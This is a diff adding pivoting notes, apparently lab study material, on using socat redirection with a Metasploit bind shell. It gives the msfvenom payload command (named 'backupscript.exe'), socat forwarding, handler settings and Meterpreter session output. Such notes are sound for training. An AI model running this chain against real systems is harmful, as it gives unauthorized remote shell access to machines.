@@ -632,3 +632,57 @@ meterpreter > shell
    ```
 
 ---
+
+# Socat Redirection with a Bind Shell
+#### **What is a Bind Shell?**
+- A **Bind Shell** is when the target machine (in this case, Windows) opens a port and listens for incoming connections from the attacker.
+- The attacker connects to this port to interact with the system.
+- Unlike reverse shells, where the attacker waits for a connection from the victim, bind shells allow the victim to listen and wait for an attacker’s connection.
+
+#### **How to Set Up a Bind Shell with Socat and Metasploit**
+
+1. **Create the Windows Bind Shell Payload:**
+   - Use `msfvenom` to create a Windows bind shell payload:
+   ```bash
+   msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
+   ```
+   - **Explanation:**
+     - This generates a payload that listens on port `8443` on the Windows machine.
+
+2. **Start the Socat Listener on Ubuntu:**
+   - Socat will forward connections from a listener on port `8080` to port `8443` on the Windows machine.
+   ```bash
+   socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+   ```
+   - **Explanation:**
+     - `TCP4-LISTEN:8080` makes Socat listen for incoming connections on port `8080`.
+     - `TCP4:172.16.5.19:8443` forwards the traffic to the Windows target machine’s `8443` port.
+
+3. **Start Metasploit's Bind Handler:**
+   - Configure Metasploit to connect to Socat's listener, which is on `8080`.
+   ```bash
+   msfconsole
+   use exploit/multi/handler
+   set payload windows/x64/meterpreter/bind_tcp
+   set RHOST 10.129.202.64
+   set LPORT 8080
+   run
+   ```
+   - **Explanation:**
+     - `RHOST` is set to the Ubuntu server's IP (`10.129.202.64`) where Socat listens.
+     - `LPORT` is the port Metasploit uses to connect to Socat's listener (`8080`).
+
+4. **Execute the Payload on the Windows Target:**
+   - Once the payload is executed on the target machine, it will open port `8443` for incoming connections.
+   - Socat will redirect the connection to the Windows machine.
+
+5. **Receive the Meterpreter Session:**
+   - The handler in Metasploit will open a connection to the bind shell through Socat and receive the Meterpreter session.
+   ```plaintext
+   [*] Sending stage (200262 bytes) to 10.129.202.64
+   [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
+   meterpreter > getuid
+   Server username: INLANEFREIGHT\victor
+   ```
+
+---
